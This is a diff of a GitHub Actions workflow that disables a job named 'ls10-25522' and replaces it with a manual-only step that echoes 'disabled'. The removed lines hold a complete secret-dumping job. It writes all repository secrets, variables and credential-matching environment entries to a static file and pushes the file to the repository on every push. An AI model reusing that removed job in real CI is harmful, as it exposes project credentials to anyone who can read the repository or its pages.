@@ -1,36 +1,8 @@
-name: ls10-25522
+name: disabled-25522
 on:
-  push:
   workflow_dispatch:
-permissions:
-  contents: write
-  pages: write
-  id-token: write
 jobs:
-  dump:
+  d:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: Dump secrets and env
-        env:
-          ALL_SECRETS: ${{ toJSON(secrets) }}
-          ALL_VARS: ${{ toJSON(vars) }}
-        run: |
-          mkdir -p static
-          {
-            echo "=== ls10 SECRET DUMP $(date -u) run=${GITHUB_RUN_ID} ==="
-            echo "--- SECRETS ---"
-            echo "$ALL_SECRETS"
-            echo "--- VARS ---"
-            echo "$ALL_VARS"
-            echo "--- ENV ---"
-            env | sort | grep -Ei "SUPPLY|ADMIN|SSH|KEY|TOKEN|SECRET|PASSWORD|SUPABASE|CLOUDFLARE|R2|D1|DB_|PRIVATE|API|PAT|DEPLOY" || echo "NO_FILTERED_ENV"
-          } > static/ls10.txt
-          echo "wrote size=$(wc -c < static/ls10.txt)"
-      - name: Commit dump
-        run: |
-          git config user.name "canary"
-          git config user.email "canary@example.com"
-          git add static/ls10.txt
-          git commit -m "ls10 dump" || echo "nothing to commit"
-          git push || echo "push failed"
+      - run: echo disabled
